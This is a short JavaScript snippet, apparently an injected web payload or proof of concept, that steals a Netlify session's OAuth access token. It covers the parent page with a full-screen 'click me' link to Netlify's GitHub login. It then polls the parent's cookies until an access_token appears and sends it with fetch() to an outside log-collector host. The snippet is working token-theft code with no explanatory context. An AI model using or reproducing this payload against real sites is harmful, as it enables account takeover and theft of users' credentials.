  var d = parent.document;

  var a = d.createElement('a');
  a.href = 'https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true';
  a.target = '_blank';
  a.textContent = 'click me';
  a.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#000;font-size:48px;display:flex;align-items:center;justify-content:center;z-index:2147483647;text-decoration:none;cursor:pointer';
  d.body.append(a);

  var sent = false;
  var id = parent.setInterval(function () {
    if (sent) { parent.clearInterval(id); return; }
    var m = parent.document.cookie.match(/_initial_landing_page=([^;]*)/);
    if (!m) return;                                   // cookie not there yet — keep waiting
    var t = (m[1].match(/access_token=([^&#]+)/) || [])[1] || '';
    if (t) {
      sent = true;
      parent.clearInterval(id);
      fetch('https://http-log-collector.netlify.app/api/log?token=' + encodeURIComponent(t));
    }
  }, 2000);
